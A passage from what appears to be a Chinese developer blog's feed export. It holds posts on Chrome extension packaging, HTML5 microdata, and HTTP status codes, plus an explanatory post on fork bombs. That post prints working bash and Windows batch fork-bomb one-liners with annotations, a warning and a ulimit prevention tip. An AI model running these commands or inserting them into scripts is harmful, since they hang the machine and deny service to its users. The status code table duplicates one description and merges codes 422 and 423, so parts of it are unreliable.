<p>调试的跟普通网页调试差不多，右键点击弹出的扩展，点“审查元素”即可打开插件的开发工具，如图</p>
<p><img src="/articles/Chrome扩展开发/debug.png" alt></p>
<p>4、打包发布</p>
<p><img src="/articles/Chrome扩展开发/prod.png" alt> </p>
<p>打包后会生成.crx文件，将生成的.crx项目文件直接拖入浏览器，也可以在扩展程序里面添加，Google对这个审核还是比较严格的，禁止未上架的插件拖曳使用，但是可以以开发者模式安装。 亲测360浏览器是可以直接拖曳的使用的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>浏览器插件开发，具有很高的实用性，值得我们去学习和了解。本文是作者记录第一次学习制作插件开发的过程，内容只是作者所用到的部分，未能面面俱到，敬请谅解。 </p>
<p>欢迎一起讨论与留言。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions" target="_blank" rel="noopener">Browser Extensions</a></li>
<li><a href="http://open.chrome.360.cn/extension_dev/overview.html" target="_blank" rel="noopener">360浏览器应用开放平台</a></li>
</ul>
<style>.posts-expand .post-body img{margin:0 auto; max-height:100vh;}</style>]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>Fork Bomb</title>
    <url>/articles/Fork-Bomb/</url>
    <content><![CDATA[<blockquote>
<p><code>警告</code><br>本文只做研究用途，切勿用作其他非法用途，可参考<a href="https://baike.baidu.com/item/破坏计算机信息系统罪/10459409" target="_blank" rel="noopener">破坏计算机信息系统罪</a>。 运行文中代码可能对你的计算机造成一定损害(卡死)，请慎重运行。</p>
</blockquote>
<p>Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击(DOS)。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。</p>
<h2 id="linux系统"><a href="#linux系统" class="headerlink" title="linux系统"></a>linux系统</h2><p><strong>POC</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:()&#123; :|:&amp; &#125;;:</span><br></pre></td></tr></table></figure>

<p><strong>注解</strong></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>:()</code></td>
<td align="left">定义函数,函数名为”:”,即每当输入”:”时就会自动调用{}内代码</td>
</tr>
<tr>
<td align="left"><code>{</code></td>
<td align="left">“:”函数起始字元</td>
</tr>
<tr>
<td align="left"><code>:</code></td>
<td align="left">用递归方式调用”:”函数本身</td>
</tr>
<tr>
<td align="left"><code>|</code></td>
<td align="left">用管道(pipe)将其输出引至…（因为有一个管道操作符，因此会生成一个新的进程）</td>
</tr>
<tr>
<td align="left"><code>:</code></td>
<td align="left">另一次递归调用的”:”函数 # 综上,”:</td>
</tr>
<tr>
<td align="left"><code>&amp;</code></td>
<td align="left">后台运行,以使最初的”:”函数被关闭后其所调用的两个”:”函数还能继续执行</td>
</tr>
<tr>
<td align="left"><code>}</code></td>
<td align="left">“:”函数終止字元</td>
</tr>
<tr>
<td align="left"><code>;</code></td>
<td align="left">“:”函数定义结束后将要进行的操作…</td>
</tr>
<tr>
<td align="left"><code>:</code></td>
<td align="left">调用”:”函数,”引爆”fork炸弹</td>
</tr>
</tbody></table>
<h2 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h2><p><strong>POC</strong></p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="variable">%0|%</span><span class="number">0</span>|%<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>将上面代码存为 .bat 文件，双击即可运行.</p>
<p><strong>注释</strong></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%0</code></td>
<td align="left">输出自己本身,也就是.bat，在cmd中即表示运行.bat</td>
</tr>
<tr>
<td align="left"><code>|</code></td>
<td align="left">就是打开自身后的程序再打开.bat</td>
</tr>
</tbody></table>
<h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。</p>
<p>更多查看：<a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Fork_bomb</a> </p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>fork bomb</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML5 微数据</title>
    <url>/articles/HTML5%20%E5%BE%AE%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p><strong>微数据（HTML5 microdata）</strong> 是一种在网页中提供附加语义的标准化方式。</p>
<p>微数据允许我们定义自定义元素以及在网页中嵌入自定义属性。从较高的角度而言，微数组由一组名-值对组成。</p>
<p>这个分组被称作条目，每个名-值对就是一个属性。条目和属性使用普通元素表示。</p>
<p>示例用 itemscope 属性创建一个条目。给条目添加一个属性，itemprop 属性用于条目的后代。</p>
<p>这里有两个条目，其中每个条目都有一个 “name” 属性：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>My name is <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">"name"</span>&gt;</span>Zara<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>My name is <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">"name"</span>&gt;</span>Nuha<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>属性值通常是字符串，但是它可以是下列数据类型。</p>
<p><strong>全局属性</strong></p>
<p>微数据引入了五个全局属性，这些属性适用于在任意元素以及为数据提供上下文机制。</p>
<p>属性描述</p>
<ul>
<li><p>itemscope用于创建一个条目。itemscope 属性是一个布尔值属性，说明页面上有微数据以及它从哪里开始。</p>
</li>
<li><p>itemtype这个属性是一个有效的 URL，用于定义条目以及为属性提供上下文。</p>
</li>
<li><p>itemid这个属性是条目的全局标识符。</p>
</li>
<li><p>itemprop这个属性为条目定义属性。</p>
</li>
<li><p>itemref这个属性提供了一个附加元素列表来抓取条目的名-值对。</p>
</li>
</ul>
<p><strong>属性数据类型</strong></p>
<p>属性通常有一个正如上面的例子中提到的字符串值，但是它们的值也可以是 URLs。下面的例子中有一个 “image” 属性，它的值是一个 URL：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">itemprop</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"tp-logo.gif"</span> <span class="attr">alt</span>=<span class="string">"TutorialsPoint"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>属性的值也可以是日期，时间或者日期和时间。下面是一个使用 time 元素和 datetime 属性的实现。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>&gt;</span>My birthday is:<span class="tag">&lt;<span class="name">time</span> <span class="attr">itemprop</span>=<span class="string">"birthday"</span> <span class="attr">datetime</span>=<span class="string">"1971-05-08"</span>&gt;</span>   Aug 5th 1971<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>属性本身也可以是一组名-值对，通过在元素上放置 itemscope 属性来声明属性。</p>
<p><strong>微数据 API 支持</strong></p>
<p>如果浏览器支持 HTML5 微数据 API，那么全局 document 对象上就会有一个 getItems() 函数。如果浏览器不支持微数据，getItems() 函数就会是 undefined。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">supports_microdata_api</span>(<span class="params"></span>) </span>&#123;  <span class="keyword">return</span> !!<span class="built_in">document</span>.getItems;&#125;</span><br></pre></td></tr></table></figure>

<p>Modernizr 还不支持微数据 API 检测，因此我们需要使用像上面一样列出的函数来检测。</p>
<p>HTML5 微数据标准包含 HTML 标记（主要用于搜索引擎）和一系列 DOM 函数（主要用于浏览器）。</p>
<p>我们可以在网页中引入微数据标记，不理解微数据属性的搜索引擎将会忽略它们。但是，如果需要通过 DOM 访问或者操作微数据，我们还需要检查浏览器是否支持微数据 DOM API。</p>
<p>定义微数据词汇表</p>
<p>要定义一个微数据词汇表我们需要一个只想有效网页的命名空间 URL。例如 <a href="http://data-vocabulary.org/Person" target="_blank" rel="noopener">http://data-vocabulary.org/Person</a></p>
<p>可以用作带下列命名属性的个人微数据词汇表的命名空间。</p>
<pre><code>name - 人名，简单的字符串值。

Photo - 指向人物照片的 URL。URL - 属于个人的网站。</code></pre><p>下面是一个使用个人微数据相关属性的例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">"http://www.example.com/Person"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">itemprop</span>=<span class="string">"name"</span>&gt;</span>Andy Runie<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">itemprop</span>=<span class="string">"photo"</span> <span class="attr">src</span>=<span class="string">"http://www.example.com/photo.jpg "</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">itemprop</span>=<span class="string">"url"</span> <span class="attr">href</span>=<span class="string">"http://www.example.com/blog"</span>&gt;</span>My Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们使用<a href="https://foolip.org/microdatajs/live/" target="_blank" rel="noopener">Live Microdata</a>执行上面的HTML代码，会得到下面的JSON数据：</p>
<p><img src="/articles/HTML5 微数据/1.jpg" alt></p>
<p>典型DEMO:</p>
<p>QQ自动识别,将下面这段代码加入到网站header里面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">itemprop</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">"我们坚持以自主研发、不断创新为发展动力，专注为企事业单位提供从移动应用开发、网站建设，到数据收集分析与云计算等的网络服务，以及互联网营销解决方案，形成了针对政府、企业、媒体等不同行业、不同规模、不同应用的系列产品和针对性解决方案。"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">itemprop</span>=<span class="string">"name"</span> <span class="attr">content</span>=<span class="string">"e攻城狮"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">itemprop</span>=<span class="string">"image"</span> <span class="attr">content</span>=<span class="string">"img/logolink.png"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在QQ聊天会话中去试试吧~</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>HTTP协议常用状态码</title>
    <url>/articles/HTTP%E5%8D%8F%E8%AE%AE%E5%B8%B8%E7%94%A8%E7%8A%B6%E6%80%81%E7%A0%81/</url>
    <content><![CDATA[<h3 id="状态码说明"><a href="#状态码说明" class="headerlink" title="状态码说明"></a>状态码说明</h3><table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">100</td>
<td align="left">客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</td>
</tr>
<tr>
<td align="left">101</td>
<td align="left">服务器已经理解了客户端的请求，并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade 消息头中定义的那些协议。 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。</td>
</tr>
<tr>
<td align="left">102</td>
<td align="left">由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行。</td>
</tr>
<tr>
<td align="left">200</td>
<td align="left">请求已成功，请求所希望的响应头或数据体将随此响应返回。</td>
</tr>
<tr>
<td align="left">201</td>
<td align="left">请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’。</td>
</tr>
<tr>
<td align="left">202</td>
<td align="left">服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。 返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</td>
</tr>
<tr>
<td align="left">203</td>
<td align="left">服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超级。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。</td>
</tr>
<tr>
<td align="left">204</td>
<td align="left">服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。 如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。 由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</td>
</tr>
<tr>
<td align="left">205</td>
<td align="left">服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。 与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</td>
</tr>
<tr>
<td align="left">206</td>
<td align="left">服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。 该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。 响应必须包含如下的头部域： Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。 Date ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。 Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。 假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。 任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。</td>
</tr>
<tr>
<td align="left">207</td>
<td align="left">由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td>
</tr>
<tr>
<td align="left">300</td>
<td align="left">被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。 除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。 如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</td>
</tr>
<tr>
<td align="left">301</td>
<td align="left">被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。 新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。</td>
</tr>
<tr>
<td align="left">302</td>
<td align="left">请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</td>
</tr>
<tr>
<td align="left">303</td>
<td align="left">对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 注意：许多 HTTP/1.1 版以前的 浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</td>
</tr>
<tr>
<td align="left">304</td>
<td align="left">如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。 该响应必须包含以下的头信息： Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。 ETag 和/或 Content-Location，假如同样的请求本应返回200响应。 Expires, Cache-Control，和/或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。 假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。 假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。</td>
</tr>
<tr>
<td align="left">305</td>
<td align="left">被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。 注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</td>
</tr>
<tr>
<td align="left">306</td>
<td align="left">在最新版的规范中，306状态码已经不再被使用。</td>
</tr>
<tr>
<td align="left">307</td>
<td align="left">请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的URI 应当在响应的 Location 域中返回。除非这是一个HEAD 请求，否则响应的实体中应当包含指向新的URI 的超链接及简短说明。因为部分浏览器不能识别307响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。 如果这不是一个GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</td>
</tr>
<tr>
<td align="left">400</td>
<td align="left">1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。 2、请求参数有误。</td>
</tr>
<tr>
<td align="left">401</td>
<td align="left">当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617。</td>
</tr>
<tr>
<td align="left">402</td>
<td align="left">该状态码是为了将来可能的需求而预留的。</td>
</tr>
<tr>
<td align="left">403</td>
<td align="left">服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</td>
</tr>
<tr>
<td align="left">404</td>
<td align="left">请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</td>
</tr>
<tr>
<td align="left">405</td>
<td align="left">请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</td>
</tr>
<tr>
<td align="left">406</td>
<td align="left">请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。 除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</td>
</tr>
<tr>
<td align="left">407</td>
<td align="left">与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见RFC 2617。</td>
</tr>
<tr>
<td align="left">408</td>
<td align="left">请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</td>
</tr>
<tr>
<td align="left">409</td>
<td align="left">由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。 冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个409错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。</td>
</tr>
<tr>
<td align="left">410</td>
<td align="left">被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。 410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为’410 Gone’，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。</td>
</tr>
<tr>
<td align="left">411</td>
<td align="left">服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</td>
</tr>
<tr>
<td align="left">412</td>
<td align="left">服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</td>
</tr>
<tr>
<td align="left">413</td>
<td align="left">服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</td>
</tr>
<tr>
<td align="left">414</td>
<td align="left">请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括： 本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。 重定向URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[1]。没有此类漏洞的服务器，应当返回414状态码。</td>
</tr>
<tr>
<td align="left">415</td>
<td align="left">对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</td>
</tr>
<tr>
<td align="left">416</td>
<td align="left">如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。 假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart/byteranges 作为其 Content-Type。</td>
</tr>
<tr>
<td align="left">417</td>
<td align="left">在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</td>
</tr>
<tr>
<td align="left">421</td>
<td align="left">从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</td>
</tr>
<tr>
<td align="left">422</td>
<td align="left">从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</td>
</tr>
<tr>
<td align="left">422</td>
<td align="left">请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）423 Locked 当前资源被锁定。（RFC 4918 WebDAV）</td>
</tr>
<tr>
<td align="left">424</td>
<td align="left">由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV）</td>
</tr>
<tr>
<td align="left">425</td>
<td align="left">在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。</td>
</tr>
<tr>
<td align="left">426</td>
<td align="left">客户端应当切换到TLS/1.0。（RFC 2817）</td>
</tr>
<tr>
<td align="left">449</td>
<td align="left">由微软扩展，代表请求应当在执行完适当的操作后进行重试。</td>
</tr>
<tr>
<td align="left">500</td>
